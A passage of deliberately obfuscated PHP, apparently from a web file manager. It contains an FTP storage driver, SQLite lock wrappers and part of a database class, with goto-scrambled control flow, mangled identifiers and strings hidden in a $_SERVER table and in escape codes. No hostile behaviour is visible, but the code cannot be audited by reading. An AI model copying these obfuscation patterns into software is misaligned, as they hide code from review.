5); if ($this->connect === !1) { return !1; } $bŞ¡ÎœÏé = @ftp_login($this->connect, $this->username, $this->userpass); goto BƒˆäŒ®ù; BƒˆäŒ®ù: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $AŠì˜°†‹Î = $this->pasv == $Bƒß÷Ó˜ [83] ? !0 : !1; @ftp_pasv($this->connect, $AŠì˜°†‹Î); goto eÀó³™’¤; eµ´–÷Ë¿Ñ: $Bƒß÷Ó˜  =& $_SERVER[Å¸ş]; static $b¶å‰°ƒ¯ë = array(); $CÆæÉÓÏ› = md5(json_encode($BŠøÜ¦íì¬)); goto c»–êÅ¬ÑŸ; F¯Á°ºÑ•¯: $aÕ´…‰à¶Ş = isset($F¸ÊŠîÔ‘Ü[$Bƒß÷Ó˜ [168]]) && $F¸ÊŠîÔ‘Ü[$Bƒß÷Ó˜ [168]] == $Bƒß÷Ó˜ [1156] ? !0 : !1; $this->scheme = $aÕ´…‰à¶Ş ? $Bƒß÷Ó˜ [1157] : $Bƒß÷Ó˜ [1158]; $this->port = isset($F¸ÊŠîÔ‘Ü[$Bƒß÷Ó˜ [170]]) ? $F¸ÊŠîÔ‘Ü[$Bƒß÷Ó˜ [170]] : 21; goto fìÍ¤Õ‹¸; c»–êÅ¬ÑŸ: if (isset($b¶å‰°ƒ¯ë[$CÆæÉÓÏ›])) { foreach ($b¶å‰°ƒ¯ë[$CÆæÉÓÏ›] as $Bê¿àôèÍé => $bòÄñÔŸá›) { $this->{$Bê¿àôèÍé} = $bòÄñÔŸá›; } return !0; } $F¸ÊŠîÔ‘Ü = parse_url(trim($this->server, $Bƒß÷Ó˜ [8])); $this->host = $F¸ÊŠîÔ‘Ü[$Bƒß÷Ó˜ [169]]; goto F¯Á°ºÑ•¯; eÀó³™’¤: $b¶å‰°ƒ¯ë[$CÆæÉÓÏ›] = array($Bƒß÷Ó˜ [1159] => $this->connect, $Bƒß÷Ó˜ [169] => $this->host, $Bƒß÷Ó˜ [168] => $this->scheme, $Bƒß÷Ó˜ [170] => $this->port); return $bŞ¡ÎœÏé; goto cÄ¼Ôœ¾¨Ú; cÄ¼Ôœ¾¨Ú: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($d±©ğ¨ÆŞ½, $CÂÂ¦ß™ = '', $BÇ›–’— = REPEAT_RENAME) { if ($this->setContent($d±©ğ¨ÆŞ½, $CÂÂ¦ß™)) { return $this->getPathOuter($d±©ğ¨ÆŞ½); } return !1; } public function mkdir($eô¾É¥½¾¿, $AÑÔâ×Ş = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $eô¾É¥½¾¿ = $this->iconvSystem($eô¾É¥½¾¿); if ($this->isFolder($eô¾É¥½¾¿) || @ftp_mkdir($this->connect, $eô¾É¥½¾¿)) { return $this->getPathOuter($eô¾É¥½¾¿); } if (!$this->mkdir($this->pathFather($eô¾É¥½¾¿))) { return !1; } if ($eô¾É¥½¾¿ = @ftp_mkdir($this->connect, $eô¾É¥½¾¿)) { return $this->getPathOuter($eô¾É¥½¾¿); } return !1; } public function copyFile($f¥ëò­àØè, $cöÈ¹ƒÍÑÛ) { goto f¾ìˆÁ­Œ; f¾ìˆÁ­Œ: if (!$this->_isconn()) { return !1; } $c¤áèâ¹ = $this->pathThis($this->iconvSystem($f¥ëò­àØè)); $eíîÀÃ§–  = $this->tempFile($c¤áèâ¹); goto có‚µÑÅ‹œ; bÁâ÷ù³Ÿ˜: $this->tempFileRemve($eíîÀÃ§– ); return $c¡šŠ—æÔ; goto cé•İ÷§ºÎ; có‚µÑÅ‹œ: $e½‚è­Íø° = $this->iconvApp($eíîÀÃ§– ); $this->download($f¥ëò­àØè, $e½‚è­Íø°); $c¡šŠ—æÔ = $this->upload($cöÈ¹ƒÍÑÛ, $e½‚è­Íø°); goto bÁâ÷ù³Ÿ˜; cé•İ÷§ºÎ: } public function moveFile($bÏ½‘–ôÊÓ, $BÖîçãïÚÒ) { if (!$this->_isconn()) { return !1; } $bÏ½‘–ôÊÓ = $this->iconvSystem($bÏ½‘–ôÊÓ); $BÖîçãïÚÒ = $this->iconvSystem($BÖîçãïÚÒ); $A¢Ãâ†«»© = @ftp_rename($this->connect, $bÏ½‘–ôÊÓ, $BÖîçãïÚÒ); return $A¢Ãâ†«»© ? $this->getPathOuter($BÖîçãïÚÒ) : !1; } public function delFile($Fö´™ùòÏË) { if (!$this->_isconn()) { return !1; } $Fö´™ùòÏË = $this->iconvSystem($Fö´™ùòÏË); return @ftp_delete($this->connect, $Fö´™ùòÏË); } public function delFolder($EÏ¢Ã‹º–«) { if (!$this->_isconn()) { return !1; } $EÏ¢Ã‹º–« = $this->iconvSystem($EÏ¢Ã‹º–«); $A¸‹®ìè˜³ = $this->ftpList($EÏ¢Ã‹º–«); if (!$A¸‹®ìè˜³) { return @ftp_rmdir($this->connect, $EÏ¢Ã‹º–«); } foreach ($A¸‹®ìè˜³ as $E«¬œªÙ‚) { if ($this->isFolder($E«¬œªÙ‚)) { $E«¬œªÙ‚ = $this->iconvApp($E«¬œªÙ‚); $this->delFolder($E«¬œªÙ‚); } else { @ftp_delete($this->connect, $E«¬œªÙ‚); } } return @ftp_rmdir($this->connect, $EÏ¢Ã‹º–«); } public function rename($dì“º´¹œ‚, $aÄä„Ø„ˆ) { goto bÛÇĞ›‹÷à; cÖÌ©‡ºé: return $Bëİ†„–ø± ? $this->getPathOuter($b×İ’Îïµó) : !1; goto Aå›è¶öä; EÒˆ·¸ÛÌó: $D±àçÌ‚· = $this->iconvSystem($D±àçÌ‚·); $dì“º´¹œ‚ = $this->iconvSystem($dì“º´¹œ‚); $e™ˆöÂÌ±® = $this->pathFather($dì“º´¹œ‚); goto BØŒ¡¢¢ªÊ; BØŒ¡¢¢ªÊ: $b×İ’Îïµó = rtrim($e™ˆöÂÌ±®, $Aº…ğ°Ù½[8]) . $Aº…ğ°Ù½[8] . $D±àçÌ‚·; $Bëİ†„–ø± = @ftp_rename($this->connect, $dì“º´¹œ‚, $b×İ’Îïµó); $b×İ’Îïµó = $this->iconvApp($b×İ’Îïµó); goto cÖÌ©‡ºé; bÛÇĞ›‹÷à: $Aº…ğ°Ù½ =& $_SERVER[Å¸ş]; if (!$this->_isconn()) { return !1; } $D±àçÌ‚· = $this->fileNameAuto($this->pathFather($dì“º´¹œ‚), $aÄä„Ø„ˆ); goto EÒˆ·¸ÛÌó; Aå›è¶öä: } private function folderInfo($b«É¹›ÒË, $E©……Ÿˆ„Ë = false) { goto FŒßÖÏ‚Ô„; a…ë¾Ïœô: $Dñ¶¦‡Ö‡Ş = $this->iconvSystem($b«É¹›ÒË); if ($E©……Ÿˆ„Ë) { return array($DÎµ°•ò‚İ[28] => $d»Ö¦¨‹ÌÂ, $DÎµ°•ò‚İ[75] => $F•øŠË²ãñ, $DÎµ°•ò‚İ[29] => $DÎµ°•ò‚İ[76]); } $A„±÷ÄÀ™„ = array($DÎµ°•ò‚İ[28] => $d»Ö¦¨‹ÌÂ, $DÎµ°•ò‚İ[75] => $F•øŠË²ãñ, $DÎµ°•ò‚İ[29] => $DÎµ°•ò‚İ[76], $DÎµ°•ò‚İ[187] => 0, $DÎµ°•ò‚İ[107] => 0, $DÎµ°•ò‚İ[1160] => !0, $DÎµ°•ò‚İ[1161] => !0); goto Eç…„ã¡ìÚ; FŒßÖÏ‚Ô„: $DÎµ°•ò‚İ =& $_SERVER[Å¸ş]; $F•øŠË²ãñ = $this->getPathOuter(rtrim($b«É¹›ÒË, $DÎµ°•ò‚İ[8])); $d»Ö¦¨‹ÌÂ = $this->pathThis($F•øŠË²ãñ); goto a…ë¾Ïœô; Eç…„ã¡ìÚ: return $A„±÷ÄÀ™„; goto fÈŞ›ó‘°å; fÈŞ›ó‘°å: } private function fileInfo($eÃè»Ù‘‰, $cù¦Şõã¢Î = false) { goto cÒÈĞùœŠë; cÒÈĞùœŠë: $E÷ÈÜê =& $_SERVER[Å¸ş]; $a‘‘á¹¤•— = $this->getPathOuter(rtrim($eÃè»Ù‘‰, $E÷ÈÜê[8])); $B©µà£ƒ² = $this->pathThis($a‘‘á¹¤•—); goto aì†ÉŞ…; bİ«¤ù°•: $b…˜Ä„·‘§[$E÷ÈÜê[107]] = $b…˜Ä„·‘§[$E÷ÈÜê[107]] > 0 ? $b…˜Ä„·‘§[$E÷ÈÜê[107]] : 0; return $b…˜Ä„·‘§; goto cÈø‹¥¾ï; aì†ÉŞ…: $b×ïÁËŸÌø = $this->iconvSystem($eÃè»Ù‘‰); if ($cù¦Şõã¢Î) { return array($E÷ÈÜê[28] => $B©µà£ƒ², $E÷ÈÜê[75] => $a‘‘á¹¤•—, $E÷ÈÜê[29] => $E÷ÈÜê[167], $E÷ÈÜê[160] => $this->ext($eÃè»Ù‘‰), $E÷ÈÜê[77] => $this->size($eÃè»Ù‘‰)); } $b…˜Ä„·‘§ = array($E÷ÈÜê[28] => $B©µà£ƒ², $E÷ÈÜê[75] => $a‘‘á¹¤•—, $E÷ÈÜê[29] => $E÷ÈÜê[167], $E÷ÈÜê[187] => 0, $E÷ÈÜê[107] => @ftp_mdtm($this->connect, $b×ïÁËŸÌø), $E÷ÈÜê[160] => $this->ext($eÃè»Ù‘‰), $E÷ÈÜê[77] => $this->size($eÃè»Ù‘‰), $E÷ÈÜê[1160] => !0, $E÷ÈÜê[1161] => !0); goto bİ«¤ù°•; cÈø‹¥¾ï: } public function size($Eâİ½ š³Ä) { $DãÈÏã§¡ò = $this->objectMeta($Eâİ½ š³Ä); return $DãÈÏã§¡ò ? $DãÈÏã§¡ò[$_SERVER[Å¸ş][77]] : 0; } public function info($aâ‡ŒÍäÀÖ) { if ($this->isFile($aâ‡ŒÍäÀÖ)) { return $this->fileInfo($aâ‡ŒÍäÀÖ, 0); } else { if ($this->isFolder($aâ‡ŒÍäÀÖ)) { return $this->folderInfo($aâ‡ŒÍäÀÖ); } } return !1; } public function exist($bœ¹¤„…ù) { return $this->objectMeta($bœ¹¤„…ù) ? !0 : !1; } public function isFile($A²ÌîÕ…Â·) { $eÍõ‰Ñ¶‘Ó =& $_SERVER[Å¸ş]; $a–ŒÂ¸î‡¥ = $this->objectMeta($A²ÌîÕ…Â·); return $a–ŒÂ¸î‡¥ ? $a–ŒÂ¸î‡¥[$eÍõ‰Ñ¶‘Ó[29]] == $eÍõ‰Ñ¶‘Ó[167] : !1; } public function isFolder($d˜Çƒ˜Ğ§š) { $c›Á½‘ÃÛ =& $_SERVER[Å¸ş]; $câóøİˆ·Ş = $this->objectMeta($d˜Çƒ˜Ğ§š); return $câóøİˆ·Ş ? $câóøİˆ·Ş[$c›Á½‘ÃÛ[29]] == $c›Á½‘ÃÛ[76] : !1; } public function listPath($a¯¥ßÂÌì, $BÕã­”øãª = false) { goto Eº£¿¦á…Ê; BğÛÅøƒÔ: foreach ($dòÈÔòÏíö as $a¯¥ßÂÌì) { if ($this->isFolder($a¯¥ßÂÌì)) { $f¡í…Ğæ×¬[$bÇ’ˆ¤»öÅ[74]][] = $this->folderInfo($a¯¥ßÂÌì, $BÕã­”øãª); } else { $f¡í…Ğæ×¬[$bÇ’ˆ¤»öÅ[73]][] = $this->fileInfo($a¯¥ßÂÌì, $BÕã­”øãª); } } return $f¡í…Ğæ×¬; goto AÏÎåŸ¬âÜ; Eº£¿¦á…Ê: $bÇ’ˆ¤»öÅ =& $_SERVER[Å¸ş]; if (!$this->_isconn()) { return !1; } $a¯¥ßÂÌì = $this->iconvSystem($a¯¥ßÂÌì); goto F÷îŸ™†£; F÷îŸ™†£: $dòÈÔòÏíö = $this->ftpList($a¯¥ßÂÌì); $f¡í…Ğæ×¬ = array($bÇ’ˆ¤»öÅ[74] => array(), $bÇ’ˆ¤»öÅ[73] => array()); if (!$dòÈÔòÏíö) { return $f¡í…Ğæ×¬; } goto BğÛÅøƒÔ; AÏÎåŸ¬âÜ: } public function has($C­¥¾¶èí, $CÅºà¯âÓÅ = false, $aÁğİ™‘¨ = true) { goto Cõé°£ª˜Ô; Cõé°£ª˜Ô: $Eµ¦Èî‰„¾ =& $_SERVER[Å¸ş]; if (!$this->_isconn()) { return !1; } $C­¥¾¶èí = $this->iconvSystem($C­¥¾¶èí); goto B¬Ê³ÆÔ©…; DØ’ˆ–åŒ«: foreach ($Fµöùë–ç as $C­¥¾¶èí) { if ($aÁğİ™‘¨) { if (!$this->isFolder($C­¥¾¶èí)) { return !0; } } else { if ($this->isFolder($C­¥¾¶èí)) { return !0; } } } return !1; goto FóİºŸò”ß; B¬Ê³ÆÔ©…: $Fµöùë–ç = $this->ftpList($C­¥¾¶èí); if (!$Fµöùë–ç) { return !1; } if ($CÅºà¯âÓÅ) { return array($Eµ¦Èî‰„¾[191] => 0, $Eµ¦Èî‰„¾[192] => count($Fµöùë–ç)); } goto DØ’ˆ–åŒ«; FóİºŸò”ß: } public function listAll($cï½®ãİİì) { goto A†‚î¢‡ÕŒ; cÕ“Ü¡ ¡¥: $c‘Å‘‹öÈ‹ = array($c‰ÊéˆÈ·[73] => array(), $c‰ÊéˆÈ·[74] => array()); $this->recursionFtpFiles($cï½®ãİİì, $c‘Å‘‹öÈ‹); $DÇ™ˆ¨Ú å = array(); goto b—Œ›ùò´î; b—Œ›ùò´î: foreach ($c‘Å‘‹öÈ‹[$c‰ÊéˆÈ·[74]] as $d¿¹¢’…¦) { $DÇ™ˆ¨Ú å[] = array($c‰ÊéˆÈ·[75] => $c‰ÊéˆÈ·[8] . trim(str_replace($cï½®ãİİì, $c‰ÊéˆÈ·[33], $d¿¹¢’…¦), $c‰ÊéˆÈ·[8]) . $c‰ÊéˆÈ·[8], $c‰ÊéˆÈ·[76] => 1, $c‰ÊéˆÈ·[77] => 0); } foreach ($c‘Å‘‹öÈ‹[$c‰ÊéˆÈ·[73]] as $D†¡É¹¤‹¢) { $DÇ™ˆ¨Ú å[] = array($c‰ÊéˆÈ·[75] => $c‰ÊéˆÈ·[8] . trim(str_replace($cï½®ãİİì, $c‰ÊéˆÈ·[33], $D†¡É¹¤‹¢), $c‰ÊéˆÈ·[8]), $c‰ÊéˆÈ·[76] => 0, $c‰ÊéˆÈ·[77] => $this->size($D†¡É¹¤‹¢)); } return $DÇ™ˆ¨Ú å; goto cİ¦ìäõÍ; A†‚î¢‡ÕŒ: $c‰ÊéˆÈ· =& $_SERVER[Å¸ş]; if (!$this->_isconn()) { return !1; } $cï½®ãİİì = $this->iconvSystem($cï½®ãİİì); goto cÕ“Ü¡ ¡¥; cİ¦ìäõÍ: } public function getContent($e”˜ƒàª¹) { if (!$this->_isconn()) { return !1; } $e”˜ƒàª¹ = $this->iconvSystem($e”˜ƒàª¹); return $this->fileSubstr($e”˜ƒàª¹); } public function setContent($cÛ¿´Šë¬, $F–ÈÁ÷â = '') { goto eå¶¿³¥; b›ÁîÜ“…•: file_put_contents($dĞ×æœ‘Ë, $F–ÈÁ÷â); $Aã ÏË×¤ = $this->upload($cÛ¿´Šë¬, $this->iconvApp($dĞ×æœ‘Ë)); $this->tempFileRemve($dĞ×æœ‘Ë); goto cœÁğãÃª¢; eå¶¿³¥: if (!$this->_isconn()) { return !1; } $AÉÌ¨¬ŒØÃ = $this->pathThis($this->iconvSystem($cÛ¿´Šë¬)); $dĞ×æœ‘Ë = $this->tempFile($AÉÌ¨¬ŒØÃ); goto b›ÁîÜ“…•; cœÁğãÃª¢: return $Aã ÏË×¤; goto BÃÀ‚ñì¥ù; BÃÀ‚ñì¥ù: } public function fileSubstr($Fˆåî‰†óò, $f–ß²¿å”Î = 0, $FÎÏÜ¥§”‰ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Fˆåî‰†óò, $f–ß²¿å”Î, $FÎÏÜ¥§”‰); } private function ftpRequest($c§Ğ©çé, $f¶ÁõÊ«ğ = 0, $bÉà¦§à‚ = false) { goto A…Æ–Ñ¼¸¨; A…Æ–Ñ¼¸¨: $c§Ğ©çé = $this->iconvSystem($c§Ğ©çé); $AŒóÔ…â = $this->scheme . $this->host . $_SERVER[Å¸ş][4] . $this->port; $A”ë÷¬„… = curl_init(); goto b™çÒğ•; b™çÒğ•: curl_setopt($A”ë÷¬„…, CURLOPT_URL, $AŒóÔ…â . $this->pathEncode($c§Ğ©çé)); curl_setopt($A”ë÷¬„…, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($bÉà¦§à‚) { $e«½˜¬ë§– = $f¶ÁõÊ«ğ + $bÉà¦§à‚ - 1; curl_setopt($A”ë÷¬„…, CURLOPT_RANGE, "{$f¶ÁõÊ«ğ}\55{$e«½˜¬ë§–}"); } goto Bˆ¨Ô…­óÔ; Dè‚ªñš: return $e‚³Ç‹ÖË; goto CŠÂš§òé˜; Bˆ¨Ô…­óÔ: curl_setopt($A”ë÷¬„…, CURLOPT_RETURNTRANSFER, 1); $e‚³Ç‹ÖË = curl_exec($A”ë÷¬„…); curl_close($A”ë÷¬„…); goto Dè‚ªñš; CŠÂš§òé˜: } public function upload($C¤îÙù¡ñ, $e·Ê©ÑŒ‰š, $aŠÒŸãÀÎ¢ = false, $cËÄİï‹ÉÍ = REPEAT_REPLACE) { goto bÏÀ‹º²ƒ; a’¥„…ßµç: $e·Ê©ÑŒ‰š = $this->iconvSystem($e·Ê©ÑŒ‰š); $Eø²ÖÃÕˆç = ftp_nb_put($this->connect, $C¤îÙù¡ñ, $e·Ê©ÑŒ‰š, FTP_BINARY); while ($Eø²ÖÃÕˆç == FTP_MOREDATA) { $Eø²ÖÃÕˆç = ftp_nb_continue($this->connect); } goto aæøÓÚ¡; bÏÀ‹º²ƒ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($C¤îÙù¡ñ))) { return !1; } $C¤îÙù¡ñ = $this->iconvSystem($C¤îÙù¡ñ); goto a’¥„…ßµç; aæøÓÚ¡: if ($Eø²ÖÃÕˆç != FTP_FINISHED) { return !1; } return $this->getPathOuter($C¤îÙù¡ñ); goto A“Ì××Õ¬; A“Ì××Õ¬: } public function download($bÊÄÒóˆñ, $c¹óÎØËÙ¹ = '') { goto AÂ°Í™•Í; DğÛ™£Ø™‘: $bÊÄÒóˆñ = $this->iconvSystem($bÊÄÒóˆñ); $c¹óÎØËÙ¹ = $this->iconvSystem($c¹óÎØËÙ¹); $fÈ´î‰«İê = ftp_nb_get($this->connect, $c¹óÎØËÙ¹, $bÊÄÒóˆñ, FTP_BINARY); goto eèåÛØ³×; eèåÛØ³×: while ($fÈ´î‰«İê == FTP_MOREDATA) { $fÈ´î‰«İê = ftp_nb_continue($this->connect); } if ($fÈ´î‰«İê != FTP_FINISHED) { return !1; } return $this->iconvApp($c¹óÎØËÙ¹); goto e¨÷‡â”·Æ; AÂ°Í™•Í: if (!$this->_isconn()) { return !1; } $E‘Áã×›å = $this->pathFather($c¹óÎØËÙ¹); if (!IO::mkdir($E‘Áã×›å)) { return !1; } goto DğÛ™£Ø™‘; e¨÷‡â”·Æ: } private function ftpList($DÍ‹¤õØåÓ) { goto EšÏ¾´çÓ; EšÏ¾´çÓ: $a†¿ö§ò³ =& $_SERVER[Å¸ş]; if (!$this->isFolder($DÍ‹¤õØåÓ)) { return !1; } @ftp_chdir($this->connect, $a†¿ö§ò³[8]); goto F°„ˆ¶‚öô; dõò¿¼´ : $f‡ƒ´Ÿ‚îĞ = array_diff($f‡ƒ´Ÿ‚îĞ, array($a†¿ö§ò³[91], $a†¿ö§ò³[1163], $DÍ‹¤õØåÓ . $a†¿ö§ò³[91], $DÍ‹¤õØåÓ . $a†¿ö§ò³[1163])); $EÇòï©ê“Ë = array(); foreach ($f‡ƒ´Ÿ‚îĞ as $AÜ¬·°İ•) { if (!strstr($AÜ¬·°İ•, $a†¿ö§ò³[8])) { $AÜ¬·°İ• = $DÍ‹¤õØåÓ . ltrim($AÜ¬·°İ•, $a†¿ö§ò³[8]); } $EÇòï©ê“Ë[] = $this->iconvApp($AÜ¬·°İ•); } goto Fİ‡«‡°; Fİ‡«‡°: return $EÇòï©ê“Ë; goto DÔ˜ÛØÑˆŠ; F°„ˆ¶‚öô: $DÍ‹¤õØåÓ = rtrim($DÍ‹¤õØåÓ, $a†¿ö§ò³[8]) . $a†¿ö§ò³[8]; $f‡ƒ´Ÿ‚îĞ = @ftp_nlist($this->connect, $DÍ‹¤õØåÓ); if ($f‡ƒ´Ÿ‚îĞ === !1) { $f‡ƒ´Ÿ‚îĞ = @ftp_rawlist($this->connect, $DÍ‹¤õØåÓ); foreach ($f‡ƒ´Ÿ‚îĞ as $eåéÇ“Ö¬‚ => $D½Ä†ê–ä) { $f‡ƒ´Ÿ‚îĞ[$eåéÇ“Ö¬‚] = end(explode($a†¿ö§ò³[1162], $D½Ä†ê–ä)); } } goto dõò¿¼´ ; DÔ˜ÛØÑˆŠ: } private function recursionFtpFiles($Cµï•É¢Ñø, &$Bß–ÄøÑ­) { $c¼·ß©ê =& $_SERVER[Å¸ş]; if (!$this->_isconn()) { return !1; } if (!($EÀÅÉ§è¹ã = $this->ftpList($Cµï•É¢Ñø))) { return !1; } foreach ($EÀÅÉ§è¹ã as $Cµï•É¢Ñø) { if ($this->isFolder($Cµï•É¢Ñø)) { $this->recursionFtpFiles($Cµï•É¢Ñø, $Bß–ÄøÑ­); $Bß–ÄøÑ­[$c¼·ß©ê[74]][] = $Cµï•É¢Ñø; } else { $Bß–ÄøÑ­[$c¼·ß©ê[73]][] = $Cµï•É¢Ñø; } } } private function objectMeta($d“Š˜òÎ…) { goto CâÉÈ; fÅ°ÕùÃ•ä: if ($A—òÈë»Ç !== null && $A—òÈë»Ç !== !1) { return $A—òÈë»Ç; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $f‰‡ ï´ÌÒ[8]); goto E“Úµ‚Ñ¡¡; E“Úµ‚Ñ¡¡: $dø÷ÍÌšÔ¡ = @ftp_size($this->connect, $this->iconvSystem($d“Š˜òÎ…)); if ($dø÷ÍÌšÔ¡ != -1) { $A—òÈë»Ç = array($f‰‡ ï´ÌÒ[77] => $dø÷ÍÌšÔ¡, $f‰‡ ï´ÌÒ[29] => $f‰‡ ï´ÌÒ[167]); } else { $dÊ†Ù¢­£¨ = @ftp_chdir($this->connect, $this->iconvSystem($d“Š˜òÎ…)); $A—òÈë»Ç = $dÊ†Ù¢­£¨ ? array($f‰‡ ï´ÌÒ[77] => 0, $f‰‡ ï´ÌÒ[29] => $f‰‡ ï´ÌÒ[76]) : !1; } Cache::set($EõÎ°¨ˆºÜ, $A—òÈë»Ç, 0); goto AºˆšÑÄ÷å; CâÉÈ: $f‰‡ ï´ÌÒ =& $_SERVER[Å¸ş]; $EõÎ°¨ˆºÜ = $f‰‡ ï´ÌÒ[1164] . md5($d“Š˜òÎ…); $A—òÈë»Ç = Cache::get($EõÎ°¨ˆºÜ); goto fÅ°ÕùÃ•ä; AºˆšÑÄ÷å: return $A—òÈë»Ç; goto eƒâÀƒ; eƒâÀƒ: } } goto Aôµˆ«‘™; bèâ½Êë¾ç: class DbSqlite extends DbSqliteBase { public function query($f¢ñÊ†Ì©) { goto a°ƒ¡ÑÖ™ç; a°ƒ¡ÑÖ™ç: $cİù°â„¦à =& $_SERVER[Å¸ş]; $a˜åß¤Û®° = DATA_PATH . $cİù°â„¦à[869]; $DšïÇÉ¶À± = fopen($a˜åß¤Û®°, $cİù°â„¦à[870]); goto D‡çÔ¬¼«®; e– Ü—Ìçë: fclose($DšïÇÉ¶À±); show_json($cİù°â„¦à[871], !1); return !1; goto D‡Õø·˜¶¿; D‡çÔ¬¼«®: if (!$DšïÇÉ¶À±) { return !1; } if (flock($DšïÇÉ¶À±, LOCK_EX)) { $EÖãÔ·ñÊŞ = parent::query($f¢ñÊ†Ì©); flock($DšïÇÉ¶À±, LOCK_UN); fclose($DšïÇÉ¶À±); return $EÖãÔ·ñÊŞ; } flock($DšïÇÉ¶À±, LOCK_UN); goto e– Ü—Ìçë; D‡Õø·˜¶¿: } public function execute($Dàˆáíîù‚) { goto E›š¹óéİ‘; aÜÑÊèó“: if (!$C‰ÍÊŸœ«ˆ) { return !1; } if (flock($C‰ÍÊŸœ«ˆ, LOCK_EX)) { $Bğ‡‚‡ÀÊø = parent::execute($Dàˆáíîù‚); flock($C‰ÍÊŸœ«ˆ, LOCK_UN); fclose($C‰ÍÊŸœ«ˆ); return $Bğ‡‚‡ÀÊø; } flock($C‰ÍÊŸœ«ˆ, LOCK_UN); goto a“‹Ö‰Š; a“‹Ö‰Š: fclose($C‰ÍÊŸœ«ˆ); show_json($fÒ´†Ÿ¸ç[871], !1); return !1; goto a­³™©¿¬’; E›š¹óéİ‘: $fÒ´†Ÿ¸ç =& $_SERVER[Å¸ş]; $a†œ×èØ = DATA_PATH . $fÒ´†Ÿ¸ç[869]; $C‰ÍÊŸœ«ˆ = fopen($a†œ×èØ, $fÒ´†Ÿ¸ç[870]); goto aÜÑÊèó“; a­³™©¿¬’: } } class DbSqlite3 extends DbSqlite3Base { public function query($Bó—Ú÷İ˜‡) { goto fè¾Ú±æ§; b†ñ«À·ˆ¥: fclose($BÊËÛ¯²š›); show_json($DªÔ§°«…µ[871], !1); return !1; goto bŒ§ñ‡òŒ; B†«Ï·‚¥: if (!$BÊËÛ¯²š›) { return !1; } if (flock($BÊËÛ¯²š›, LOCK_EX)) { $cò‰™É…š = parent::query($Bó—Ú÷İ˜‡); flock($BÊËÛ¯²š›, LOCK_UN); fclose($BÊËÛ¯²š›); return $cò‰™É…š; } flock($BÊËÛ¯²š›, LOCK_UN); goto b†ñ«À·ˆ¥; fè¾Ú±æ§: $DªÔ§°«…µ =& $_SERVER[Å¸ş]; $Cá­İ‰êæÑ = DATA_PATH . $DªÔ§°«…µ[869]; $BÊËÛ¯²š› = fopen($Cá­İ‰êæÑ, $DªÔ§°«…µ[870]); goto B†«Ï·‚¥; bŒ§ñ‡òŒ: } public function execute($EŠËÏÜ¦‡ª) { goto Dõ¾·—¿ñÊ; b¯º¬ïËåä: fclose($f½Û„”·¸); show_json($eÕ¨©İø„‡[871], !1); return !1; goto D²‹Œ½ÒíÉ; e±ö·Ø¶: if (!$f½Û„”·¸) { return !1; } if (flock($f½Û„”·¸, LOCK_EX)) { $döØ¾ìÂÌ« = parent::execute($EŠËÏÜ¦‡ª); flock($f½Û„”·¸, LOCK_UN); fclose($f½Û„”·¸); return $döØ¾ìÂÌ«; } flock($f½Û„”·¸, LOCK_UN); goto b¯º¬ïËåä; Dõ¾·—¿ñÊ: $eÕ¨©İø„‡ =& $_SERVER[Å¸ş]; $e³øîàÓ” = DATA_PATH . $eÕ¨©İø„‡[869]; $f½Û„”·¸ = fopen($e³øîàÓ”, $eÕ¨©İø„‡[870]); goto e±ö·Ø¶; D²‹Œ½ÒíÉ: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\151\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\x65\x71" => "\74\x3e", "\147\164" => "\x3e", "\145\x67\164" => "\76\x3d", "\x6c\164" => "\74", "\x65\154\164" => "\x3c\x3d", "\156\x6f\x74\x6c\151\x6b\145" => "\x4e\x4f\124\40\114\x49\113\x45", "\154\151\153\x65" => "\x4c\x49\113\x45", "\x69\156" => "\111\116", "\156\x6f\x74\151\156" => "\x4e\x4f\x54\40\x49\x4e", "\156\157\164\x20\x69\156" => "\x4e\x4f\124\40\111\116", "\142\x65\x74\167\x65\x65\x6e" => "\x42\x45\124\x57\105\x45\116", "\156\x6f\164\x62\145\x74\x77\x65\145\156" => "\116\x4f\x54\x20\102\105\x54\127\105\105\116", "\156\x6f\164\x20\x62\145\x74\x77\x65\145\156" => "\x4e\x4f\124\40\102\105\124\x57\105\x45\x4e"); protected $selectSql = "\123\105\114\x45\x43\124\45\104\111\x53\124\x49\x4e\103\124\x25\x20\45\106\x49\105\x4c\x44\x25\x20\106\x52\117\115\x20\x25\124\x41\102\x4c\105\45\x25\112\x4f\111\116\x25\x25\x57\x48\105\122\105\45\45\x47\122\117\x55\x50\x25\45\x48\101\x56\111\116\107\45\45\x4f\x52\104\x45\x52\45\45\x4c\x49\x4d\x49\124\x25\40\x25\x55\116\x49\x4f\x4e\45\x25\x43\x4f\115\x4d\105\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $EæÉ»í¹ª = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Å¸ş][872], $EæÉ»í¹ª); } public function factory($EóÂÈİ¯éÖ = '') { goto B³°›ºƒæË; bÌ‰˜Ï ¤÷: return $aÍÜÂ½ê‰¤; goto f¸‚ŸİŒÖğ; B³°›ºƒæË: $fäÕÊ¥´’† =& $_SERVER[Å¸ş]; $EóÂÈİ¯éÖ = $this->parseConfig($EóÂÈİ¯éÖ); if (empty($EóÂÈİ¯éÖ[$fäÕÊ¥´’†[873]])) { think_exception(think_lang($fäÕÊ¥´’†[874])); } goto cï”™­ÜØ; cï”™­ÜØ: $this->dbType = ucwords(strtolower($EóÂÈİ¯éÖ[$fäÕÊ¥´’†[873]])); $Aê‚½Û´›Ş = $fäÕÊ¥´’†[875] . $this->dbType; if (class_exists($Aê‚½Û´›Ş)) { $aÍÜÂ½ê‰¤ = new $Aê‚½Û´›Ş($EóÂÈİ¯éÖ); if ($fäÕÊ¥´’†[726] != strtolower($EóÂÈİ¯éÖ[$fäÕÊ¥´’†[873]])) { $aÍÜÂ½ê‰¤->dbType = strtoupper($this->dbType); } else { $aÍÜÂ½ê‰¤->dbType = 